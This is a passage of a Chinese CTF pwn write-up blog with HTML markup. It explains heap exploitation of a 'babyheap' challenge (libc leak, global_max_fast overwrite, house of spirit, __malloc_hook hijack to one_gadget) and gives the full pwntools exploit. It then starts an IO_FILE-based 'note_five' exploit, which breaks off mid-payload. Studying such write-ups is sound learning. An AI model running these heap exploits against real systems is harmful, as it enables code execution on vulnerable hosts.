string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>global_max_fast <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x3c67f8</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"global_max_fast => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>global_max_fast<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>__malloc_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>__libc_realloc_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_realloc'</span><span class="token punctuation">]</span>one_gadget_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>one_gadgetlog<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"__malloc_hook_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"__libc_realloc_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__libc_realloc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"one_gadget_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>有了libc基地址之后，我们就进行下一步，修改global_max_fast<br>我们需要将某个free掉的chunk的bk指针修改为global_max_fast-0x10处，这就需要构造fake chunk，即house of sprit技术(直接通过overlap行不通，因为这题edit的长度是原chunk输入内容的长度，而输入内容的长度是通过strlen函数判断的，遇到’\x00’就会截至)<br>我们先将chunk恢复原状</p><pre class=" language-python"><code class="language-python"><span class="token triple-quoted-string string">'''add(0x18, 'a'*0x18)add(0x28, 'a')add(0x38, 'a')add(0x28, 'a')add(0x18, 'a'*0x18)edit(0, 'a'*0x18+p8(0xa1))free(1)add(0x28, 'a')show(2)'''</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>然后进行如下操作</p><pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>至于为什么这么操作，我们进入gdb看看<br>首先是free(1)之后<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/5.jpg" alt=""><br>接着构造我们的fakechunk<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/6.jpg" alt=""><br>接着将unsorted bin中剩下的0x50大小的chunk也分配出来，然后依次free掉我们刚刚add的chunk</p><pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#这里实际上free的是我们的fakechunk</span></code></pre><p>我们再进到gdb看看<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/7.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/8.jpg" alt=""><br>可以看到我们的fakechunk确实被放入了unsortedbin中，并且由于fakechunk的fd和bk指针都包含在chunk1中，所以我们可重新分配chunk1，然后将fakechunk的bk指针修改</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>global_max_fast<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/9.jpg" alt=""><br>可以看到global_max_fast的值变成了main_arena的地址，也就是说我们接下来就可以使用fastbin了<br>最后的fastbin attack也利用了house of sprit技术，就不多赘述了，下面是完整exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babyheap'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># io=remote('nc.eonew.cn',10502)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babyheap'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23.so'</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> <span class="token number">0x4526a</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">9</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>global_max_fast <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x3c67f8</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"global_max_fast => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>global_max_fast<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>__malloc_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>__libc_realloc_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_realloc'</span><span class="token punctuation">]</span>one_gadget_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>one_gadgetlog<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"__malloc_hook_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"__libc_realloc_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__libc_realloc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"one_gadget_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>global_max_fast<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__libc_realloc_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="note-five"><a href="#note-five" class="headerlink" title="note_five"></a>note_five</h2><p>考察点：IO_FILE利用<br>这道题我是拿大师傅的exp一步步调试的，算是弄明白了在没有show函数的情况下如何泄露出libc地址<br><a href="https://xz.aliyun.com/t/6468" target="_blank" rel="noopener">这位大师傅</a><br>我对原exp做了点改动，符合个人习惯一点，exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># coding=utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>local <span class="token operator">=</span> <span class="token number">1</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./note_five'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">bk</span><span class="token punctuation">(</span>mallocr<span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">"b *"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>mallocr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sl</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sd</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rc</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ru</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ti</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    ru<span class="token punctuation">(</span><span class="token string">"choice>> "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    ru<span class="token punctuation">(</span><span class="token string">"choice>> "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    ru<span class="token punctuation">(</span><span class="token string">"choice>> "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    sd<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    malloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">0xe0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x2f0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span>    edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x2f0</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    global_max_fast <span class="token operator">=</span> <span class="token number">0x77f8</span>    stdout <span class="token operator">=</span> <span class="token number">0x77f8</span> <span class="token operator">-</span> <span class="token number">0x1229</span>    payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0x77f8</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p16<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>    py <span class="token operator">=</span> <span class="token string">''</span>    py <span class="token operator">+=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x41</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> 